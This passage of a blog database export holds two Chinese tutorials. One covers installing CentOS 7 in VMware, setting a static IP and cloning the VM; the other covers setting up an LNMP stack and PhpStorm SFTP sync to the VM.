src=\"https://img-blog.csdn.net/20180711223841653?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>4.选择稍后安装操作系统</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201707/2017071710574731.jpg\"><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711223854551?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>5.操作系统的选择</p>\n\n<p>这里选择之后安装的操作系统，正确的选择会让vm tools更好的兼容。这里选择linux下的CentOS</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711223907671?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p> </p>\n\n<p>6.虚拟机位置与命名</p>\n\n<p>虚拟机名称就是一个名字，在虚拟机多的时候方便自己找到。</p>\n\n<p>VMwear的默认位置是在C盘下，我这里改成F盘。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711223917420?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201707/2017071710574833.jpg\"></p>\n\n<p>7.处理器与内存的分配</p>\n\n<p>处理器分配要根据自己的实际需求来分配。在使用过程中CPU不够的话是可以再增加的。这次只做安装CentOS演示，所以处理器与核心都选1.</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201707/2017071710574834.jpg\"><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711223929865?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>内存也是要根据实际的需求分配。我的宿主机内存是8G所以我给虚拟机分配2G内存。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711223943268?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201707/2017071710574835.jpg\"></p>\n\n<p>8.网络连接类型的选择，网络连接类型一共有桥接、NAT、仅主机和不联网四种。</p>\n\n<p>桥接：选择桥接模式的话虚拟机和宿主机在网络上就是平级的关系，相当于连接在同一交换机上。</p>\n\n<p>NAT：NAT模式就是虚拟机要联网得先通过宿主机才能和外面进行通信。</p>\n\n<p>仅主机：虚拟机与宿主机直接连起来</p>\n\n<p>桥接与NAT模式访问互联网过程，如下图所示</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224004659?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>桥接与NAT区别</p>\n\n<p>这里选择桥接模式</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224016785?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201707/2017071710574937.jpg\"></p>\n\n<p>9.其余两项按虚拟机默认选项即可</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224042387?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>10.磁盘容量</p>\n\n<p>磁盘容量暂时分配100G即可后期可以随时增加，不要勾选立即分配所有磁盘，否则虚拟机会将100G直接分配给CentOS，会导致宿主机所剩硬盘容量减少。</p>\n\n<p>勾选将虚拟磁盘拆分成多个文件，这样可以使虚拟机方便用储存设备拷贝复制。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224059391?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>11.磁盘名称，默认即可</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224115667?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>12.取消不需要的硬件</p>\n\n<p>点击自定义硬件</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/2018071122413290?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>选择声卡、打印机等不需要的硬件然后移除。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224147231?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>13.点击完成，已经创建好虚拟机。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224200707?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p><strong>3.安装CentOS</strong></p>\n\n<p>1.连接光盘</p>\n\n<p>右击刚创建的虚拟机，选择设置</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224217850?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>先选择CD/DVD，再选择使用ISO映像文件，最后选择浏览找到下载好的镜像文件。启动时连接一定要勾选上后确定。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224233121?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>2.开启虚拟机</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224302639?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>3.安装操作系统</p>\n\n<p>开启虚拟机后会出现以下界面</p>\n\n<ol><li>Install CentOS 7 安装CentOS 7</li>\n\t<li>Test this media &amp; install CentOS 7 测试安装文件并安装CentOS 7</li>\n\t<li>Troubleshooting 修复故障</li>\n</ol><p>选择第一项，安装直接CentOS 7，回车，进入下面的界面</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201707/2017071710575447.jpg\"><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224323926?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>选择安装过程中使用的语言，这里选择英文、键盘选择美式键盘。点击Continue</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/2018071122433632?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>首先设置时间</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/2018071122434772?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>时区选择上海，查看时间是否正确。然后点击Done</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224410105?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>选择需要安装的软件</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224421911?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>选择 Server with Gui，然后点击Done</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224438720?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>选择安装位置，在这里可以进行磁盘划分。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224452307?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>选择i wil configure partitioning（我将会配置分区），然后点击done</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224505907?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>如下图所示，点击加号，选择/boot，给boot分区分200M。最后点击Add</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224522794?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>然后以同样的办法给其他三个区分配好空间后点击Done</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224533382?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>然后会弹出摘要信息，点击AcceptChanges(接受更改)</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224549412?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>设置主机名与网卡信息</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224603320?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>首先要打开网卡，然后查看是否能获取到IP地址(我这里是桥接)，再更改主机名后点击Done。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224618785?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>最后选择Begin Installation(开始安装)</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/2018071122463197?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>设置root密码</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/2018071122464660?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>设置root密码后点击Done</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224658899?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>点击USER CREATION 创建管理员用户</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224711277?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>输入用户名密码后点击Done</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/2018071122472498?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>等待系统安装完毕重启系统即可</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180711224741348?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p> </p>\n\n<p>以上就是本文的全部内容，希望对大家的学习有所帮助。</p>\n\n<p><strong>以下为我自己整理的克隆虚拟机和设置固定IP的方法，记录一下，以防忘记：</strong></p>\n\n<p><strong><strong>桥接模式网络配置</strong></strong></p>\n\n<p><strong>1、配置ip地址等信息在/etc/sysconfig/network-scripts/ifcfg-ens33文件里做如下配置：</strong></p>\n\n<p> 命令：</p>\n\n<pre class=\"has\">\n<code>vi   /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre>\n\n<p>修改如下：</p>\n\n<pre>\n\n </pre>\n\n<ol><li>\n\t<p><code>TYPE=\"Ethernet\"   # 网络类型为以太网</code></p>\n\t</li>\n\t<li>\n\t<p><code>BOOTPROTO=\"static\"  # 手动分配ip</code></p>\n\t</li>\n\t<li>\n\t<p><code>NAME=\"ens33\"  # 网卡设备名，设备名一定要跟文件名一致</code></p>\n\t</li>\n\t<li>\n\t<p><code>DEVICE=\"ens33\"  # 网卡设备名，设备名一定要跟文件名一致</code></p>\n\t</li>\n\t<li>\n\t<p><code>ONBOOT=\"yes\"  # 该网卡是否随网络服务启动</code></p>\n\t</li>\n\t<li>\n\t<p><code>IPADDR=\"192.168.220.101\"  # 该网卡ip地址就是你要配置的固定IP，如果你要用xshell等工具连接，220这个网段最好和你自己的电脑网段一致，否则有可能用xshell连接失败</code></p>\n\t</li>\n\t<li>\n\t<p><code>GATEWAY=\"192.168.220.2\"   # 网关</code></p>\n\t</li>\n\t<li>\n\t<p><code>NETMASK=\"255.255.255.0\"   # 子网掩码</code></p>\n\t</li>\n\t<li>\n\t<p><code>DNS1=\"8.8.8.8\"    # DNS，8.8.8.8为Google提供的免费DNS服务器的IP地址</code></p>\n\t</li>\n</ol><p><strong>2、配置网络工作</strong></p>\n\n<p>在/etc/sysconfig/network文件里增加如下配置</p>\n\n<pre>\n\n </pre>\n\n<ol><li>\n\t<p><code>命令：</code></p>\n\t</li>\n\t<li> </li>\n\t<li>\n\t<p><code>vi /etc/sysconfig/network</code></p>\n\t</li>\n\t<li> </li>\n\t<li> </li>\n\t<li>\n\t<p><code>修改：</code></p>\n\t</li>\n\t<li> </li>\n\t<li>\n\t<p><code>NETWORKING=yes # 网络是否工作，此处一定不能为no</code></p>\n\t</li>\n</ol><p>3、<strong><strong>配置公共DNS服务(可选)</strong></strong></p>\n\n<p>在/etc/resolv.conf文件里增加如下配置</p>\n\n<pre class=\"has\">\n<code>nameserver 8.8.8.8</code></pre>\n\n<p>4、<strong><strong>关闭防火墙</strong></strong></p>\n\n<pre>\n\n </pre>\n\n<ol><li>\n\t<p><code>systemctl stop firewalld # 临时关闭防火墙</code></p>\n\t</li>\n\t<li>\n\t<p><code>systemctl disable firewalld # 禁止开机启动</code></p>\n\t</li>\n</ol><p>5、<strong><strong>重启网络服务</strong></strong></p>\n\n<pre class=\"has\">\n<code>service network restart</code></pre>\n\n<p> 下面是克隆虚拟机：</p>\n\n<p>先查看虚拟机的网关</p>\n\n<p><img alt=\"\" class=\"has\" height=\"661\" src=\"https://img-blog.csdnimg.cn/20181118133935906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=,size_16,color_FFFFFF,t_70\" width=\"1200\"></p>\n\n<p>2、将要克隆的虚拟机关机，右键点击要克隆的虚拟机：</p>\n\n<p>右键点击虚拟机，选择“管理”、“克隆”</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180704204058261?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>然后下一步</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180704204226663?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>再下一步</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180704204252548?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>选择第二个“创建完整克隆”，后下一步</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180704204326257?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>给自己的克隆机命名、选择位置后点击“完成”。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180704204850768?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>然后就开始克隆了，时间不会太久，整个过程大概1~2分钟。</p>\n\n<p>完成克隆后点击关闭即克隆成功了。此时是可以在虚拟机列表中看到刚刚克隆的虚拟机“Clone”的。如下：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdn.net/20180704204944459?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n\n<p>此时这个克隆出来的虚拟机和原虚拟机各个配置都是一样的，我们接下来要对网络、主机名等进行配置。<br><br>\n修改配置文件<strong>/etc/sysconfig/network-scripts/ifcfg-ens33中的IPADDR</strong></p>\n\n<pre class=\"has\">\n<code>IPADDR=\"192.168.220.102\"</code></pre>\n\n<p>修改主机名：</p>\n\n<pre class=\"has\">\n<code>hostnamectl set-hostname   xxxx(你要的主机名字)</code></pre>\n\n<p> 修改hosts文件，将名字和IP建立联系</p>\n\n<p>输入命令“vi /etc/hosts”后，在配置文件中加入</p>\n\n<pre>\n\n </pre>\n\n<ol><li> </li>\n\t<li>\n\t<p><code>127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4</code></p>\n\t</li>\n\t<li>\n\t<p><code>::1 localhost localhost.localdomain localhost6 localhost6.localdomain6</code></p>\n\t</li>\n\t<li>\n\t<p><code>192.168.220.103（你锁修改的主机IP） xxxxxxxx(你要的主机名字)</code></p>\n\t</li>\n</ol><p>重启:reboot </p>\n                                    </div>", "log_PostTime": 1584891122, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7环境搭建使用PhpStorm上传代码", "log_Intro": "CentOS7环境搭建使用PhpStorm上传代码", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1><strong>一、虚拟机介绍</strong></h1>\n\n<p>虚拟机（Virtual Machine）指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。</p>\n\n<p>虚拟系统通过生成现有操作系统的全新虚拟镜像，它具有真实windows系统完全一样的功能，进入虚拟系统后，所有操作都是在这个全新的独立的虚拟系统里面进行，可以独立安装运行软件，保存数据，拥有自己的独立桌面，不会对真正的系统产生任何影响 ，而且具有能够在现有系统与虚拟镜像之间灵活切换的一类操作系统。</p>\n\n<p>流行的虚拟机软件有VMware(VMWare ACE）、Virtual Box和Virtual PC，它们都能在Windows系统上虚拟出多个计算机。</p>\n\n<h2>虚拟机VMware</h2>\n\n<p>VMware（威睿） 是全球桌面到数据中心虚拟化解决方案的领导厂商。全球不同规模的客户依靠VMware来降低成本和运营费用、确保业务持续性、加强安全性并走向绿色。VMware使企业可以采用能够解决其独有业务难题的云计算模式。</p>\n\n<p>Vmware百度百科地址：https://baike.baidu.com/item/VMware</p>\n\n<p>使用的版本：VMware-workstation-full-15.0.4-12990004</p>\n\n<h1>二、Centos操作系统</h1>\n\n<p>CentOS（Community Enterprise Operating System，中文意思是社区企业操作系统）是Linux发行版之一，它是来自于Red Hat Enterprise Linux依照开放源代码规定释出的源代码所编译而成。由于出自同样的源代码，因此有些要求高度稳定性的服务器以CentOS替代商业版的Red Hat Enterprise Linux使用。两者的不同，在于CentOS完全开源。</p>\n\n<p>使用的版本：CentOS-7-x86_64-Minimal-1810.iso</p>\n\n<p>百度百科：https://baike.baidu.com/item/centos/498948?fr=aladdin</p>\n\n<p>官网：https://www.centos.org/</p>\n\n<h1>三、编辑器：PhpStorm</h1>\n\n<p>PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。</p>\n\n<p>使用版本：Phpstorm2019.02 官网：http://www.jetbrains.com/phpstorm/</p>\n\n<h1>四、系统初始化</h1>\n\n<p>安装好minimal centos操作系统后的基本配置</p>\n\n<p>1、配置好网卡 ifup ens33</p>\n\n<p>2、如果希望下次进入系统，网卡自动启动可以进入    </p>\n\n<p>3、配置静态IP</p>\n\n<p>centos7静态网络配置</p>\n\n<p>cd /etc/sysconfig/network-scripts<br>\n找到当前网卡名字<br>\nvim ifcfg-ens33<br>\nTYPE=\"Ethernet\" #<br>\nBOOTPROTO=\"static\" #网卡获取IP地址的方式，默认是dhcp，这里改为static，dhcp是动态获取<br>\nDEFROUTE=\"yes\"<br>\nIPV4_FAILURE_FATAL=\"no\"<br>\nIPV6INIT=\"yes\"<br>\nIPV6_AUTOCONF=\"yes\"<br>\nIPV6_DEFROUTE=\"yes\"<br>\nIPV6_FAILURE_FATAL=\"no\"<br>\nIPV6_ADDR_GEN_MODE=\"stable-privacy\"<br>\nNAME=\"ens33\" #网卡的名字<br>\nUUID=\"ec101075-0264-46c6-8fec-2e9613aebf6d\" #网卡的uuid<br>\nDEVICE=\"ens160\"<br>\nONBOOT=\"yes\" #默认我no，这里改为yes，表示开启自动重启网卡<br>\nIPADDR=\"192.168.1.237\" #要配置的静态IP地址<br>\nPREFIX=\"24\" #子网掩码<br>\nGATEWAY=\"192.168.1.1\" #网关地址<br>\nDNS1=\"192.168.1.1\"<br>\nIPV6_PEERDNS=\"yes\"<br>\nIPV6_PEERROUTES=\"yes\"<br>\nIPV6_PRIVACY=\"no\"</p>\n\n<p>因为新安装完操作系统以后，网卡内部信息太多太杂乱，此时我们可以直接更改如下：<br>\nTYPE=Ethernet #配置为互联网网卡<br>\nBOOTPROTO=static #配置获取IP地址形式为静态获取<br>\nIPADDR=192.168.100.112 #配置网卡地址<br>\nNETMASK=255.255.255.0 #配置子网掩码<br>\nNETWORK=192.168.100.0 #配置网络地址<br>\nNAME=enp0s3 #配置网卡名字<br>\nDEVICE=enp0s3 #网卡硬件名字<br>\nONBOOT=yes #开启自动重启<br>\nDNS1=114.114.114.114 #配置dns<br>\nGATEWAY=192.168.100.1 #配置网关</p>\n\n<p>然后重启服务执行，即可看到网络已经配好：<br>\nsystemctl status network<br>\nsystemctl start network<br>\nsystemctl stop network<br>\nsystemctl restart network</p>\n\n<p>此外，网卡还可以从这个地方配置：</p>\n\n<p>vim /etc/sysconfig/network</p>\n\n<h1 id=\"created-by-anaconda\">Created by anaconda</h1>\n\n<p>NETWORKING=yes<br>\nNETWORKING_IPV6=no<br>\nHOSTNAME=localhost.localdomain<br>\nGATEWAY=192.168.1.1 #配置网关<br>\n这个文件默认为空，只有第一行，我们可配可不配。<br>\n然后重启服务执行，即可看到网络已经配好：<br>\nsystemctl status network<br>\nsystemctl start network<br>\nsystemctl stop network<br>\nsystemctl restart network</p>\n\n<p>vi /etc/sysconfig/network-script/ifconfig-ens33 onboot 改为yes就好 然后在使用ip addr 即可看到系统的ip地址</p>\n\n<h1>五、Lnmp环境搭建</h1>\n\n<p>Lnmp安装包下载</p>\n\n<p>下载地址：https://lnmp.org/ 建议下载稳定的最新版本(官网下载，或者wget方式都行)</p>\n\n<p>使用版本： lnmp1.5-full.tar.gz</p>\n\n<p>1、解压 tar zxf lnmp1.5-full.tar.gz</p>\n\n<p>2、安装 cd lnmp1.5-full &amp;&amp; sh install.sh mphp</p>\n\n<p>3、根据提示一步一步安装即可</p>\n\n<h1>六、配置虚拟主机</h1>\n\n<h3>1、centos 系统上配置虚拟主机</h3>\n\n<p>a、cd /usr/local/nginx/conf/vhost 新建文件以.conf结尾</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190530235659234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p>b、创建对应网站根目录，设置好所有者以及权限</p>\n\n<p>c、cd /usr/local/nginx/conf     vi  nginx.conf</p>\n\n<p><img alt=\"\" class=\"has\" height=\"675\" src=\"https://img-blog.csdnimg.cn/20190530235710562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"825\"></p>\n\n<h3>2、修改windows操作系统hosts文件【注意文件权限配置】</h3>\n\n<p>C:\\Windows\\System32\\drivers\\etc\\hosts</p>\n\n<p>把ip和域名写入即可 至此，本地可以正常访问centos中的站点</p>\n\n<h1>七、Phpstorm 配置sftp与centos实现文件同步</h1>\n\n<p><img alt=\"\" class=\"has\" height=\"204\" src=\"https://img-blog.csdnimg.cn/20190530234941963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"428\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"204\" src=\"https://img-blog.csdnimg.cn/20190530234958831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"441\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"226\" src=\"https://img-blog.csdnimg.cn/20190530235010825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"441\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"226\" src=\"https://img-blog.csdnimg.cn/20190530235018370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"428\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"586\" src=\"https://img-blog.csdnimg.cn/20190530235027196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"628\"></p>\n                                    </div>", "log_PostTime": 1584891123, "log_Meta": ""}
